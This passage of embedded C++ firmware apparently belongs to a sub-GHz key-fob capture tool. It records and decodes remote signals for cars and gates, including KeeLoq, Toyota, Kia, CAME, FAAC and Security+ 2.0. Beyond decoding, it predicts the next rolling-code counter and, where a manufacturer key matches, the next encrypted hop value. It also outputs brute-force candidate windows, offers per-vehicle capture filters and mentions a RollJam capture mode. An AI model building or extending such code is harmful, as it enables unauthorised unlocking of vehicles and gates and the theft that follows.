      if(!decoded&&ml>=66){KLFrame mf;if(ks_parseKL(mb,ml,mf)){decoded=true;doc["proto"]="KeeLoq-Manchester";doc["sn"]=mf.sn;char sh[12];snprintf(sh,12,"0x%08lX",(unsigned long)mf.hop);doc["hop"]=sh;doc["btn"]=mf.btn;doc["ctr"]=mf.rawCtr;HistEntry he={mf.sn,mf.hop,(uint32_t)mf.rawCtr,0,mhz,nowMs};ks_hPush(he);ks_krPush(mf);ks_klRecentPush(mf);KLPred pr=ks_klPredict(mf,nowMs);doc["confirmed"]=pr.found;doc["confidence"]=pr.found?(pr.pattern?"pattern-match":"crypto-confirmed"):"structural";doc["mfr"]=pr.found?pr.kname:"HCS-series (unknown mfr key)";JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=pr.delta;p["next_ctr"]=pr.nextCtr;p["key_found"]=pr.found;p["lin_est"]=String(pr.linEst,2);if(pr.found){char nh2[12];snprintf(nh2,12,"0x%08lX",(unsigned long)pr.nextHop);p["next_hop"]=nh2;p["key_pattern"]=pr.kname;}p["window"]=65536;if(pr.bwValid){JsonArray bwTop=doc["bw"].to<JsonArray>();JsonArray bwN=p["brute_window"].to<JsonArray>();for(uint8_t i=0;i<10;i++){char bh[12];if(pr.found)snprintf(bh,12,"0x%08lX",(unsigned long)pr.bw[i]);else snprintf(bh,12,"0x%04lX",(unsigned long)pr.bw[i]);bwN.add(bh);bwTop.add(pr.bw[i]);}doc["bwValid"]=true;}}}
      // PT2262-Manchester: reject all-zero and all-ones codes — these are noise
      // artefacts from Toyota/Denso preamble waveforms reaching the Manchester
      // fallback when the Toyota decoder fails.  A legitimate Princeton code is
      // never all zeros or 0xFFFFFF.  Also block the entire Toyota dual-band
      // range (311.5–315.5 MHz) — PT2262 is a gate chip, not a car-fob chip.
      if(!decoded&&!toyotaDual&&ml>=24){uint32_t mc=0;if(ks_decodePT2262(mb,ml,mc)&&mc!=0&&mc!=0xFFFFFFUL){decoded=true;doc["proto"]="PT2262-Manchester";char ch[10];snprintf(ch,10,"0x%06lX",(unsigned long)mc);doc["code"]=ch;doc["mfr"]="Princeton";}}
      // 26. CAME Atomo — 62-bit Manchester rolling, TE=600/1200µs
      if(!decoded&&te_catomf&&ml>=62){uint64_t cat_raw=0;if(ks_decodeCameAtomo(mb,ml,cat_raw)){decoded=true;char rh[18];snprintf(rh,18,"%08lX%08lX",(unsigned long)(cat_raw>>32),(unsigned long)(cat_raw&0xFFFFFFFFUL));doc["proto"]="CAME-Atomo";doc["frame"]=rh;uint32_t cat_sn=(uint32_t)(cat_raw&0xFFFFFFFFUL);doc["sn"]=cat_sn;doc["mfr"]="CAME";HistEntry he={cat_sn,0,0,25,mhz,nowMs};ks_hPush(he);JsonObject p=doc["predict"].to<JsonObject>();p["window"]=0;p["note"]="CAME Atomo 62-bit rolling — frame cipher not public";}}
      // 27. Security+ 2.0 — two interleaved 62-bit Manchester packets, TE=250/500µs
      if(!decoded&&te_secpv2&&ml>=124){uint32_t sp2sn=0,sp2cnt=0;uint8_t sp2b=0;if(ks_decodeSecPlusV2(mb,ml,sp2sn,sp2b,sp2cnt)){decoded=true;char sh[10];snprintf(sh,10,"0x%07lX",(unsigned long)sp2sn);doc["proto"]="Security+2.0";doc["sn"]=sh;doc["btn"]=sp2b;doc["ctr"]=sp2cnt;doc["mfr"]="Chamberlain/LiftMaster";HistEntry he={sp2sn,0,sp2cnt,26,mhz,nowMs};ks_hPush(he);int32_t d=ks_estDelta(sp2sn,26,sp2cnt);JsonObject p=doc["predict"].to<JsonObject>();p["delta"]=d;p["next_ctr"]=(sp2cnt+(uint32_t)d)&0xFFFFFFFU;p["window"]=65536;p["note"]="Security+ 2.0 two-packet rolling";}}
    }
  }
  // 15. OOK fallback — add km/cA/ratio diagnostics so a serial log identifies why decode failed
  if(!decoded){doc["proto"]="OOK-raw";doc["bits"]=bLen>64?String(bits).substring(0,64)+"...":String(bits);doc["bitlen"]=bLen;doc["mfr"]="";doc["diag_cA"]=cA;doc["diag_cB"]=cB;doc["diag_ratio"]=String(ratio,2);}

  doc["valid"]=decoded;
  if(!doc.containsKey("mfr")) doc["mfr"]="";
  // Confidence tier for the dashboard: KeeLoq blocks already set their own
  // ("crypto-confirmed" when a key validates, "structural" when only the frame
  // shape matched). Any other decoded protocol is a timing-based heuristic
  // match; an undecoded capture is raw.
  if(!doc.containsKey("confidence")) doc["confidence"]=decoded?"heuristic":"raw";
  if(!doc.containsKey("confirmed"))  doc["confirmed"]=false;

  // ─── Extra signal metadata for dashboard re-processing ────────────────────
  doc["te_b"]=cB; doc["blen"]=bLen; doc["cap_mode"]=fskCapMode?"2fsk":"ook";
  { JsonArray pArr=doc["pulse_us"].to<JsonArray>();
    int pN=(rfLen<200)?rfLen:200;
    for(int pi=0;pi<pN;pi++) pArr.add((uint32_t)rfBuf[pi]);
  }

  // ─── Alternative protocol candidates (re-run eligible decoders) ───────────
  // After the primary chain picks the best result, try the other eligible
  // decoders and collect up to ALT_MAX alternatives for dashboard analysis.
  { JsonArray altArr=doc["alt_decodes"].to<JsonArray>();
    int nAlt=0; const int ALT_MAX=4;
    String pp=doc["proto"].as<String>();
    // Alt: KeeLoq — if primary is not KeeLoq but TE window overlaps
    if(pp!="KeeLoq"&&pp!="KeeLoq-Manchester"&&(te_kl||te_kl_loose)){
      KLFrame af2; bool aOK=false;
      static char aklb2[CAP_SZ/2+1];
      uint32_t tc2[4]; uint8_t nt2=0;
      tc2[nt2++]=cA; if(cB>0)tc2[nt2++]=cB>>1;
      tc2[nt2++]=(mhz<320.f)?200:400;
      tc2[nt2++]=(cA+((mhz<320.f)?200:400))>>1;
      for(uint8_t t=0;t<nt2&&!aOK;t++){
        if(tc2[t]<60||tc2[t]>1000)continue;
        uint16_t kl2=ks_klPwm(buf,cnt,tc2[t],aklb2);
        if(kl2>=66&&ks_parseKL(aklb2,kl2,af2)){aOK=true;break;}
      }
      if(aOK&&nAlt<ALT_MAX){
        KLPred pr2=ks_klPredict(af2,nowMs);
        char sh2[12];snprintf(sh2,12,"0x%08lX",(unsigned long)af2.sn);
        JsonObject ao=altArr.add<JsonObject>();
        ao["proto"]="KeeLoq";ao["mfr"]=pr2.found?pr2.kname:"HCS-series";
        ao["confidence"]=pr2.found?"crypto-confirmed":"structural";
        ao["sn"]=String(sh2);ao["btn"]=af2.btn;ao["ctr"]=af2.rawCtr;nAlt++;
      }
    }
    // Alt: Toyota-Denso
    if(pp!="Toyota-Denso"&&nAlt<ALT_MAX&&te_toy){
      uint32_t tsn2=0;uint8_t tb2=0;uint16_t tc3=0;
      if(ks_decodeToyota(buf,cnt,tsn2,tb2,tc3)){
        char sh2[10];snprintf(sh2,10,"0x%06lX",(unsigned long)tsn2);
        JsonObject ao=altArr.add<JsonObject>();
        ao["proto"]="Toyota-Denso";ao["mfr"]="Toyota/Lexus (Denso)";ao["confidence"]="heuristic";
        ao["sn"]=String(sh2);ao["btn"]=tb2;ao["ctr"]=tc3;nAlt++;
      }
    }
    // Alt: CAME-12
    if(pp!="CAME-12"&&nAlt<ALT_MAX&&te_came&&bLen>=24){
      uint16_t ac2=0;
      if(ks_decodeCame12(bits,bLen,ac2)){
        char ch2[6];snprintf(ch2,6,"0x%03X",ac2);
        JsonObject ao=altArr.add<JsonObject>();
        ao["proto"]="CAME-12";ao["mfr"]="CAME";ao["confidence"]="heuristic";ao["code"]=String(ch2);nAlt++;
      }
    }
    // Alt: FAAC-64
    if(pp!="FAAC-64"&&nAlt<ALT_MAX&&te_faac&&bLen>=64){
      uint64_t afr2=0;
      if(ks_decodeFAAC64(bits,bLen,afr2)){
        char sfh2[12];snprintf(sfh2,12,"0x%08lX",(unsigned long)(uint32_t)(afr2>>32));
        JsonObject ao=altArr.add<JsonObject>();
        ao["proto"]="FAAC-64";ao["mfr"]="FAAC";ao["confidence"]="heuristic";ao["sn"]=String(sfh2);nAlt++;
      }
    }
    // Alt: KIA-V0
    if(pp!="KIA-V0"&&nAlt<ALT_MAX&&te_kv0){
      uint32_t ak0sn=0;uint16_t ak0c=0;uint8_t ak0b=0;bool ak0v=false;
      if(ks_decodeKiaV0(buf,cnt,ak0sn,ak0c,ak0b,ak0v)){
        char sfh2[12];snprintf(sfh2,12,"0x%08lX",(unsigned long)ak0sn);
        JsonObject ao=altArr.add<JsonObject>();
        ao["proto"]="KIA-V0";ao["mfr"]="Kia/Hyundai";ao["confidence"]="heuristic";
        ao["sn"]=String(sfh2);ao["ctr"]=ak0c;ao["btn"]=ak0b;ao["ck_ok"]=ak0v;nAlt++;
      }
    }
    // Alt: KIA-V1
    if(pp!="KIA-V1"&&nAlt<ALT_MAX&&te_kv1){
      static char altMbV1b[CAP_SZ/2+1];
      uint16_t aml2=ks_manchester(bits,bLen,altMbV1b);
      if(aml2>=57){
        uint32_t ak1sn=0;uint16_t ak1c=0;uint8_t ak1b=0;bool ak1v=false;
        if(ks_decodeKiaV1(altMbV1b,aml2,ak1sn,ak1c,ak1b,ak1v)){
          char sfh2[12];snprintf(sfh2,12,"0x%08lX",(unsigned long)ak1sn);
          JsonObject ao=altArr.add<JsonObject>();
          ao["proto"]="KIA-V1";ao["mfr"]="Kia/Hyundai";ao["confidence"]="heuristic";
          ao["sn"]=String(sfh2);ao["ctr"]=ak1c;ao["btn"]=ak1b;ao["ck_ok"]=ak1v;nAlt++;
        }
      }
    }
  }

  // ─── Filter annotation ────────────────────────────────────────────────────
  // When a protocol or vehicle-make filter is active, annotate the result with
  // whether it matched expectations and, if not, explain what was needed.
  // The decoders themselves always run — filtering is informational only.
  if(filterProto.length()>0 || filterVehicle.length()>0){
    String activeProto = filterProto;
    String altP1 = "", altP2 = "";
    float  fHint = 0.f;
    if(filterVehicle.length()>0 && activeProto.length()==0){
      for(uint8_t vi=0;vi<N_VEHICLES;vi++){
        if(filterVehicle==VEHICLES[vi].make){
          activeProto = VEHICLES[vi].proto1;
          altP1       = VEHICLES[vi].proto2;
          altP2       = VEHICLES[vi].proto3;
          fHint       = VEHICLES[vi].freq1;
          break;
        }
      }
    }
    doc["filter_proto"]   = filterProto;
    doc["filter_vehicle"] = filterVehicle;

    String capturedProto = doc["proto"]|"";
    bool fMatch = (activeProto.length()==0)
               || capturedProto==activeProto
               || (altP1.length()>0 && capturedProto==altP1)
               || (altP2.length()>0 && capturedProto==altP2);
    doc["filter_match"] = fMatch;

    if(!fMatch){
      String fr = "";
      if(!decoded){
        // Decode failed — explain what signal was captured vs. what was expected
        fr = "Captured " + String(rfLen) + " edges, " + String(bLen) + " bits";
        if(activeProto.length()>0){
          fr += " — no " + activeProto + " frame found. ";
          if(activeProto=="KeeLoq"){
            if(bLen<66) fr += "Need 66 bits; hold fob button for ~1 s and move closer.";
            else if(ratio<1.3f||ratio>2.9f) fr += "Pulse ratio " + String(ratio,1) + "× (KeeLoq needs ~2.0). Check frequency: EU 433.92 MHz, NA 315.00 MHz.";
            else fr += "66+ bits present but no valid rolling-code frame. Press button again.";
          } else if(activeProto=="Toyota-Denso"){
            if(!(toyotaA||toyotaB)) fr += "Signal at " + String(mhz,2) + " MHz — Toyota/Lexus fobs transmit at 314–315 or 312 MHz. Switch frequency.";
            else if(bLen<40) fr += "Need 40-bit payload; move closer and hold button ~1 s.";
            else fr += "Preamble/timing mismatch. Confirm this is a Toyota/Lexus key fob.";
          } else if(activeProto=="Subaru-RKE"){
            fr += (bLen<48) ? "Need 48 bits; move closer." : "TE=" + String(cA) + "µs (need 150–280µs). Verify 315.00 MHz.";
          } else if(activeProto=="Chrysler"){
            fr += "80-bit nibble frame not found. Chrysler/Dodge/Jeep fobs use 315 MHz.";
          } else if(activeProto=="Mazda-Siemens"){
            fr += "72-bit Siemens VDO frame not found. Mazda 2003-2009 fobs use ~433 MHz.";
          } else if(activeProto=="CAME-12"){
            fr += eu433 ? "12-bit code not found. Confirm this is a CAME transmitter." : "CAME remotes require 433.92 MHz — switch frequency first.";
          } else if(activeProto=="FAAC-64"){
            fr += eu433 ? "64-bit FAAC frame not found. Confirm FAAC SLH remote." : "FAAC remotes require 433.92 MHz — switch frequency first.";
          } else if(activeProto=="Mazda-Siemens"){
            fr += "72-bit Siemens VDO frame not found. Try 433.92 MHz.";
          } else if(activeProto=="KIA-V0"){
            fr += fskCapMode ? "61-bit OOK PWM frame not found. Move closer, hold button 1 s."
                             : "KIA-V0 needs OOK mode — disable 2FSK (cap_mode fsk=false) then retry.";
          } else if(activeProto=="KIA-V1"){
            fr += fskCapMode ? "57-bit Manchester frame not found. Move closer, hold button 1 s."
                             : "KIA-V1 needs OOK mode — disable 2FSK (cap_mode fsk=false) then retry.";
          } else {
            fr += "TE=" + String(cA) + "µs, ratio=" + String(ratio,1) + "×.";
          }
        } else if(filterVehicle.length()>0){
          fr += " for " + filterVehicle + ".";
          if(fHint>0) fr += " Expected ~" + String(fHint,2) + " MHz.";
          fr += " Press button firmly, hold ~1 s.";
        }
      } else {
        // Decoded successfully but wrong protocol
        fr = "Captured " + capturedProto;
        if(filterVehicle.length()>0 && activeProto.length()>0){
          fr += " — not a " + filterVehicle + " fob (" + filterVehicle + " uses " + activeProto + ").";
        } else if(activeProto.length()>0){
          fr += " — expected " + activeProto + ". Press the correct fob or clear the filter.";
        }
      }
      if(fr.length()>0) doc["fail_reason"] = fr;
    }
  }

  // ─── Burst-duplicate guard ────────────────────────────────────────────────
  // Two dedup criteria, applied independently:
  //
  // 1. Time-based: same proto+edges+TE within 200 ms — catches the scan-loop
  //    re-capture of the same physical RF burst (CC1101 still showing signal
  //    when next sweep fires, common at 2–4× per press).
  //
  // 2. Pulse-hash: same proto + FNV-mix of first 16 pulse widths, regardless
  //    of time — catches physically identical captures spaced >200 ms apart
  //    (e.g. 314.65 MHz duplicate 6 s apart in a library export).
  //    A real second fob press would have a different rolling code → different
  //    pulse widths in the data section → different hash.
  {
    static String   _ddProto = "";
    static uint16_t _ddEdges = 0;
    static uint16_t _ddTe    = 0;
    static uint32_t _ddMs    = 0;
    static uint32_t _ddHash  = 0;
    String  _cp = doc["proto"]|"";
    uint16_t _ce = (uint16_t)cnt;
    uint16_t _ct = (uint16_t)cA;
    // FNV-1a mix of first 16 pulse widths + frequency bucket
    uint32_t _ph = (uint32_t)(rfFreq * 100.f);
    for(int _i=0; _i<cnt&&_i<16; _i++) _ph = (_ph ^ (uint32_t)buf[_i]) * 16777619UL;
    bool _timeDup  = (_cp.length()>0 && _cp==_ddProto && _ce==_ddEdges && _ct==_ddTe && (nowMs-_ddMs)<200UL);
    bool _hashDup  = (_cp.length()>0 && _cp==_ddProto && _ph==_ddHash);
    if(_timeDup || _hashDup){
      lastDecode="{\"error\":\"dup-burst\",\"proto\":\""+_cp+"\"}";
      stackHwmAfterDecode=(uint32_t)uxTaskGetStackHighWaterMark(NULL); stackSample();
  return lastDecode;
    }
    _ddProto=_cp; _ddEdges=_ce; _ddTe=_ct; _ddMs=nowMs; _ddHash=_ph;
  }

  doc["dur_ms"] = lastCapDurMs;
  serializeJson(doc,lastDecode);
  stackHwmAfterDecode=(uint32_t)uxTaskGetStackHighWaterMark(NULL); stackSample();
  return lastDecode;
}

// ─── Capture Engine ───────────────────────────────────────────────────────────
// captureSignal() first waits for a signal, then records its edges. timeoutMs limits
// the wait; capMaxMsOverride limits recording (zero keeps the 3 s default). The
// separate recording limit lets the Ch-B fallback wait for a press and then record
// only its tail.
//
// gapUs ends a capture after that much silence. The 350 ms default preserves the
// 250–300 ms Toyota preamble gap. RollJam uses a shorter gap to save one frame rather
// than several repeats: in the measured Kia capture, frames contain about 158 pulses,
// with roughly 7 ms between repeats and 60 ms between bursts.
bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
  if(gapUs<1000) gapUs=1000;          // never so small it cuts on a single pulse
  const uint32_t gap=gapUs;
  if(!cc1101OK) return false;
  unsigned long _cT0 = millis(); // track wall-clock duration for lastCapDurMs
  // timeoutMs controls the signal wait; capMaxMs controls recording. Most callers use
  // the 3 s default. The Ch-B fallback sets a 250 ms budget so a sustained signal cannot
  // keep the sequence recording long after the press has ended. Consume that one-shot
  // override here: clearing it later would leave it set when the signal wait times out.
  uint32_t capMaxMs = capMaxMsOverride;   // 0 = use the default
  capMaxMsOverride = 0;                   // consume now, whatever path we leave by
  if(capMaxMs == 0) capMaxMs = 3000;
  pinMode(PIN_GDO0,INPUT);
  // Reset and sleep the SX1278 before using the SPI bus. This does not connect the
  // CC1101 GDO0 to GPIO 48; that path is disabled unless gdo0Routed is set.
  loraHardReset();
  // Then hold the module in reset for the capture itself. loraHardReset() writes the SPI
  // sleep register and releases RST, which leaves the part powered and contributing noise to
  // the shared front end; measurements are in loraParkReset(). Without this the floor reads
  // about 11 dB high and the trigger at floor+10 crosses on the module's own noise.
  loraParkReset();
  // SIDLE, flush the TX FIFO (0x3A), then SRX.
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x36); delay(1); cc_strobe(0x3A); delay(1); cc_strobe(0x34); delay(10);
  if(fskCapMode){ cc_writeReg(0x12,0x00); cc_writeReg(0x15,0x47); }  // 2FSK if requested
  addLog("[CAP] Capturing on "+String(curFreq,2)+" MHz…");
  setLed(255,255,0); rfLen=0; rfFreq=curFreq;

  // Average 64 RSSI samples (~32 ms) for the noise floor. Averaging avoids letting a
  // nearby fob dominate the threshold; cap suspicious readings above -60 dBm at -75.
  long _nsum=0;
  for(int i=0;i<64;i++){ _nsum+=cc_fastRSSI(); delayMicroseconds(500); }
  int noiseMax=(int)(_nsum/64);
  if(noiseMax>-60) noiseMax=-75; // cap: fob was transmitting during measurement
  // Trigger at floor +10 dBm. The former +14 margin missed weak signals near -65 dBm.
  int trigThr=noiseMax+10;
  // Toyota-band captures use floor +5 for edge detection (floor +8 elsewhere).
  // This gives weak signals more margin after the +10 dBm trigger has fired.
  bool _toyBand=(curFreq>=309.0f&&curFreq<=316.0f);
  int edgeThr=noiseMax+(_toyBand?5:8);
  addLog("  Floor: "+String(noiseMax)+" dBm  Trig: "+String(trigThr)+" / Edge: "+String(edgeThr)+" dBm"+(_toyBand?" (Toyota –3dB)":""));
  SPI.endTransaction();

  // First half of timeout: wait at the current frequency before sweeping all channels.
  bool hit=false; int peak=-130;
  unsigned long t0=millis(); uint16_t wait1=timeoutMs/2;
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  while(millis()-t0<wait1){
    int r=cc_fastRSSI();
    if(r>trigThr){peak=r;hit=true;addLog("  Signal! "+String(r)+" dBm");break;}
    yield();
  }
  SPI.endTransaction();

  // Auto-scan fallback: sweep all known frequencies, lock onto the loudest one
  if(!hit){
    addLog("  Scanning all bands…"); float bestF=curFreq; int bestR=-130;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    for(int i=0;i<N_FREQS;i++){
      if(capRangeMin>0&&(FOB_FREQS[i]<capRangeMin||FOB_FREQS[i]>capRangeMax)) continue;
      cc_setFreq(FOB_FREQS[i]); cc_strobe(0x34);
      // Linger near sticky freq during the capture fallback sweep too
      { uint16_t fd=(stickyFreq>0.0f&&fabsf(FOB_FREQS[i]-stickyFreq)<4.0f)?25:8; delay(fd); }
      long rs=0; for(int j=0;j<8;j++){rs+=cc_fastRSSI();delayMicroseconds(500);}
      int r=(int)(rs/8); if(r>bestR){bestR=r;bestF=FOB_FREQS[i];}
      // yield() every 6 freqs: prevents TWDT from firing during the fallback sweep.
      // 39 freqs × ~12 ms/freq (8 ms delay + 4 ms RSSI) ≈ 470 ms with no yield —
      // well within the 5 s budget alone, but combined with the wait loop above and
      // a retry capture below, the cumulative block can exceed 5 s on a full timeout.
      if((i&5)==5){ SPI.endTransaction(); yield(); SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0)); }
    }
    addLog("  Best: "+String(bestF,2)+" MHz @ "+String(bestR)+" dBm");
    cc_setFreq(bestF); rfFreq=bestF; cc_strobe(0x34); delay(10);
    { long _ns2=0; for(int i=0;i<32;i++){_ns2+=cc_fastRSSI();delayMicroseconds(500);}
      noiseMax=(int)(_ns2/32); if(noiseMax>-60) noiseMax=-75; }
    trigThr=noiseMax+10; edgeThr=noiseMax+8;
    SPI.endTransaction();
    long rem=max(1000L,(long)timeoutMs-(long)(millis()-t0));
    unsigned long t1=millis();
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    while(millis()-t1<(unsigned long)rem){
      int r=cc_fastRSSI();
      if(r>trigThr){peak=r;hit=true;addLog("  Signal! "+String(r)+" dBm");break;}
      yield();
    }
    SPI.endTransaction();
  }
  if(!hit){rfRssi=noiseMax;addLog("  ⚠ No signal");setLed(0,150,65);lastCapDurMs=(uint32_t)(millis()-_cT0);return false;}

  // ── Edge capture — digital GDO0 or RSSI ───────────────────────────────────
  // This board does not route the CC1101's GDO0 to GPIO 48, so the digital path is
  // opt-in. A changing GPIO level alone is not proof that the CC1101 is driving it.
  // If gdo0Routed is enabled for a board that does wire GDO0, require both HIGH and LOW
  // within 5 ms before using it. Otherwise read the CC1101's RSSI register.
  bool useGdo0=false;
  if(gdo0Routed){
    unsigned long _gt=micros(); bool _gH=false,_gL=false;
    while(micros()-_gt<5000){
      if(digitalRead(PIN_GDO0)) _gH=true; else _gL=true;
      if(_gH&&_gL){useGdo0=true;break;}
    }
  }
  lastCapGdo0=useGdo0;
  // Report only what was checked. When GDO0 is not configured as routed, no pin test ran.
  if(!gdo0Routed)          addLog("  GDO0 not routed on this revision — RSSI edge mode");
  else if(useGdo0)         addLog("  GDO0 OK — digital edge mode");
  else                     addLog("  GDO0 stuck/flat — RSSI edge mode");

  // The minimum-edge and minimum-time guards avoid ending capture on a short pause.
  setLed(0,200,255);
  // static: 512 × 2 B = 1 kB — off the stack; captureSignal is single-task only.
  static uint16_t rawBuf[CAP_SZ]; int rawLen=0;
  // The first stored pulse has this level; subsequent pulses alternate.
  bool capStartHigh=useGdo0?(bool)digitalRead(PIN_GDO0):true;
  bool lastSt=capStartHigh;
  unsigned long lastEdge=micros();
  unsigned long capStart=micros();
  // capEnd is the recording deadline. A longer silent gap can end capture sooner.
  unsigned long capEnd=capStart+(unsigned long)capMaxMs*1000UL;

  if(useGdo0){
    // ── GDO0 digital mode — no SPI in hot loop ──────────────────────────────
    // Ignore edges under 15 µs, below the shortest expected TE (~90 µs). Leaving
    // lastEdge unchanged merges each short glitch into the following pulse.
    const uint32_t GLITCH_US=15;
    // Feed the watchdog during long captures; Toyota retries can run two 3 s
    // captures back to back, longer than the default watchdog interval.
    unsigned long _wdtUs=micros();
    while(rawLen<CAP_SZ&&micros()<capEnd){
      bool cur=(bool)digitalRead(PIN_GDO0);
      if(cur!=lastSt){
        unsigned long now=micros(); uint32_t dur=now-lastEdge;
        if(dur<GLITCH_US) continue;
        if(dur>gap&&rawLen>64&&(now-capStart)>100000UL) break;
        if(dur<65535) rawBuf[rawLen++]=(uint16_t)dur;
        lastEdge=now; lastSt=cur;
      }
      if((micros()-lastEdge)>gap&&rawLen>64&&(micros()-capStart)>100000UL) break;
      { unsigned long _n=micros(); if(_n-_wdtUs>100000UL){yield();_wdtUs=_n;} }
    }
    // Spot RSSI for reporting — take a quick reading now that capture is done
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    {int sp=cc_fastRSSI(); if(sp>peak) peak=sp;}
    SPI.endTransaction();
  } else {
    // ── RSSI mode fallback ───────────────────────────────────────────────────
    // Toyota-band minimum-pulse guard: spin without advancing lastEdge/lastSt
    // until the new state has been stable for ≥ 100 µs (half a Toyota TE).
    // RSSI oscillates around edgeThr at weak signal margins, producing dozens
    // of sub-100 µs glitch crossings per second that consume rawBuf slots and
    // reduce cnt without adding usable edge data.  By requiring 100 µs of
    // stability before recording an edge we keep only real carrier on/off
    // transitions.  The main timeout (micros()<capEnd) still terminates the
    // loop; the gap check is re-evaluated on every non-short transition.
    // Non-Toyota bands use _minEdgeUs=0 → identical to the old behaviour.
    const uint32_t _minEdgeUs=_toyBand?100:0;
    unsigned long _wdtUs=micros(); // TWDT feed — same rationale as GDO0 path above
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    // The initial state must be the real carrier state, not an assumed HIGH.
    { int r0=cc_fastRSSI(); capStartHigh=(r0>edgeThr); lastSt=capStartHigh; }
    while(rawLen<CAP_SZ&&micros()<capEnd){
      int rssi=cc_fastRSSI(); bool cur=(rssi>edgeThr);
      if(cur!=lastSt){
        unsigned long now=micros(); uint32_t dur=now-lastEdge;
        if(_minEdgeUs>0&&dur<_minEdgeUs) continue; // spin until state stable ≥100µs
        if(dur>gap&&rawLen>64&&(now-capStart)>100000UL) break;
        if(dur<65535){ rawBuf[rawLen++]=(uint16_t)dur; if(rssi>peak)peak=rssi; }
        lastEdge=now; lastSt=cur;
      }
      if((micros()-lastEdge)>gap&&rawLen>64&&(micros()-capStart)>100000UL) break;
      { unsigned long _n=micros(); if(_n-_wdtUs>100000UL){SPI.endTransaction();yield();SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));_wdtUs=_n;} }
    }
    SPI.endTransaction();
  }
  rfRssi=peak;
  // Stage counts for diagnosis. Each post-processing filter below can empty a burst, and
  // the failure message ("Too few edges") does not say which one did. With captureDiag on,
  // every stage reports what it saw and what survived, so a burst that reaches the gates
  // with transitions but leaves empty names the gate that dropped it.
  int diagRaw=rawLen, diagAfter75=0, diagAfterToy=0;
  bool captureDiag = lastCapDiag;
  if(rawLen<16){addLog("  ⚠ Too few edges ("+String(rawLen)+") — likely noise");setLed(0,150,65);return false;}

  // Filter sub-75 µs glitches and merge adjacent pulses.
  // 75 µs is safely below the shortest real TE (Santa Fe: ~90 µs) while
  // removing most switching-supply and USB transient noise edges.
  //
  // Polarity: rawBuf[k] holds the width of the state that was held before the
  // transition, and those states alternate from the initial one, so
  // rawLevel(k) = capFirstHigh ^ (k&1). A parallel level array is carried through
  // the filters because dropping leading pulses would otherwise flip the parity
  // that the exporter relies on. rfStartHigh is taken from the first SURVIVING
  // pulse, which is what rfBuf[0] actually is.
  static uint8_t rfLvl[CAP_SZ];
  const bool capFirstHigh = capStartHigh;   // level of rawBuf[0] — set by the capture loop
  rfLen=0;
  for(int i=0;i<rawLen;i++){
    const bool lvl = capFirstHigh ^ ((i&1)!=0);
    if(rawBuf[i]>=75){ rfBuf[rfLen]=rawBuf[i]; rfLvl[rfLen]=lvl?1:0; rfLen++; }
    else if(rfLen>0&&i+1<rawLen){rfBuf[rfLen-1]+=rawBuf[i]+rawBuf[i+1];i++;}
  }
  diagAfter75=rfLen;
  // Toyota-band secondary noise filter: fold edges 75–149 µs into their neighbours.
  //
  // This used to DROP sub-150 µs pulses (`if(rfBuf[k]>=150) rfBuf[rn++]=...`), which
  // is the bug behind 06 §3.4a in the toy band. Recorded pulses alternate HIGH/LOW,
  // so removing one inverts the level of every pulse after it — and dropping is
  // also physically wrong: the two neighbours of a dropped pulse have the SAME
  // level, so their widths belong together.
  //
  // Measured on KIA V3 N1 RAW.sub (315 MHz, so this filter runs): the drop form
  // leaves 8170 same-level adjacencies out of 43517 pulses, i.e. the level is
  // corrupted almost immediately. Folding instead leaves 0.
  //
  // Rationale for the filter itself is unchanged: after the 75 µs glitch pass, RSSI
  // averaging tails and GDO0 ringing at sub-TE amplitude produce edges in the
  // 75–149 µs range that break the Toyota preamble pair detector (which needs ≥3
  // consecutive HI/LO pairs each within ±35%/±50% of TE0). Minimum Toyota TE is
  // 150 µs, so edges below that cannot be preamble or data pulses. Non-Toyota bands
  // are unaffected (Santa Fe TE ≈90 µs lives below 150 µs and is excluded via
  // !_toyBand), and the 75 µs pass above already folds rather than drops.
  if(_toyBand){
    int rn=0;
    for(int k=0;k<rfLen;k++){
      if(rfBuf[k]>=150){ rfBuf[rn]=rfBuf[k]; rfLvl[rn]=rfLvl[k]; rn++; }
      else if(rn>0&&k+1<rfLen){
        // Short pulse k sits between two same-level pulses; absorb k and k+1.
        rfBuf[rn-1]+=rfBuf[k]+rfBuf[k+1]; k++;
      }
    }
    rfLen=rn;
  }
  diagAfterToy=rfLen;
  if(captureDiag){
    addLog("  [DIAG] raw="+String(diagRaw)+" after75="+String(diagAfter75)+
           " afterToy="+String(diagAfterToy)+" toyBand="+String(_toyBand?"1":"0"));
  }
  // Level of rfBuf[0] after filtering. Defaults to HIGH only when nothing
  // survived, which callers treat as "no capture".
  rfStartHigh = (rfLen>0) ? (rfLvl[0]!=0) : true;
  // Pulse coherence gate: run kMeans on the filtered burst.
  // Real fob signals always form at least 2 clusters (short TE / long TE).
  // If clustering fails on a short burst, it is almost certainly noise.
  if(rfLen < 32){
    // static: 512 × 4 B = 2 kB — off the stack.
    static uint32_t tmp[CAP_SZ]; for(int i=0;i<rfLen;i++) tmp[i]=rfBuf[i];
    uint32_t cA2=0,cB2=0;
    if(!ks_km2(tmp,rfLen,cA2,cB2)){
      addLog("  ⚠ Incoherent pulses ("+String(rfLen)+" edges) — discarded as noise");
      if(captureDiag) addLog("  [DIAG] dropped at ks_km2 coherence gate, rfLen="+String(rfLen));
      rfLen=0; setLed(0,150,65); return false;
    }
  }
  // Minimum total burst duration: sum all filtered pulse widths.
  // Noise glitches are typically <2 ms total; all real fob protocols need
  // at least 5 ms (shortest: CAME-12 @ 12 bits × 300 µs × 2 = 7.2 ms).
  {
    uint32_t totalUs=0;
    for(int i=0;i<rfLen;i++) totalUs+=rfBuf[i];
    if(totalUs<5000){
      addLog("  ⚠ Burst too short ("+String(totalUs)+" µs total) — likely noise");
      if(captureDiag) addLog("  [DIAG] dropped at totalUs gate, rfLen="+String(rfLen)+" totalUs="+String(totalUs));
      rfLen=0; setLed(0,150,65); return false;
    }
  }
